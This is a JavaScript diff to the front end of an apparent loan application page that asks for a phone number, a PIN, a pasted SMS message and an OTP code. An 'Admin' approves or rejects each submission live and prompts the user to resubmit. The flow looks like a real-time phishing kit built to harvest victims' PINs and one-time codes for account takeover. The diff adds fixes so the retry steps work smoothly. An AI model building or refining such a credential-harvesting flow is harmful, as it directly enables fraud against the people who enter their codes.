@@ -790,13 +790,6 @@
       }
     }
     
-    if (id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
-      const idx = parseInt(id[6]);
-      if (idx > 0) {
-        document.getElementById('otpPin' + (idx-1)).focus();
-      }
-    }
-    
     if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
       const idx = parseInt(id[3]);
       if (idx > 0) {
@@ -823,14 +816,6 @@
     });
     chkPin();
     document.getElementById('lp0').focus();
-  }
-
-  function clearOtpPin() {
-    [0,1,2,3,4].forEach(i => {
-      document.getElementById('otpPin'+i).value = '';
-    });
-    chkOtp();
-    document.getElementById('otpPin0').focus();
   }
 
   function clearOtpCode() {
@@ -928,6 +913,7 @@
             // Clear login form
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            chkPin(); // ✅ FIX: Re-enable button state
             
             // Go back to login page
             goTo('page-login');
@@ -1002,11 +988,13 @@
         pollForSmsApproval(S.applicationId);
       } else {
         document.getElementById('bSms').disabled = false;
+        chkSmsMsg(); // ✅ FIX: Re-check button state
         showSmsMsg('error', data.message || 'Failed to submit SMS.');
       }
     } catch (err) {
       document.getElementById('mSms').classList.remove('show');
       document.getElementById('bSms').disabled = false;
+      chkSmsMsg(); // ✅ FIX: Re-check button state
       showSmsMsg('error', 'Error: ' + err.message);
     }
   }
@@ -1030,9 +1018,13 @@
             console.log('❌ Admin rejected SMS - ask user to paste correct message');
             clearTimeout(smsPollTimeout);
             goTo('page-sms-paste');
+            
+            // Clear and reset form for retry
+            const textArea = document.getElementById('smsMsgBox');
+            textArea.value = '';
+            chkSmsMsg(); // ✅ FIX: Re-enable button based on content
+            
             showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
-            // Clear the textarea for user to enter correct message
-            document.getElementById('smsMsgBox').value = '';
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
@@ -1154,8 +1146,9 @@
             goTo('page-otp');
             document.getElementById('bOtp').disabled = false;
             document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            // Clear OTP fields
+            // Clear OTP fields for retry
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            chkOtp(); // ✅ FIX: Re-check button state
             showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
           } else {
             // Still pending, keep polling
